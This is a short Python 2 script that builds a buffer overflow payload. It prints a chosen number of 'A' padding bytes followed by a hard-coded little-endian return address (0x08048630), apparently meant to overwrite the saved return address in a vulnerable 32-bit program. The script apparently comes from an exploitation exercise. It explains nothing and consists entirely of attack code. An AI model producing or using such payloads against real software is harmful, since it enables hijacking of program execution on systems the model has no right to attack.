#!/usr/bin/python
import sys

count = int (sys.argv[1])
print "A" * count + "\x30" + "\x86" + "\x04" + "\x08" + "\n"
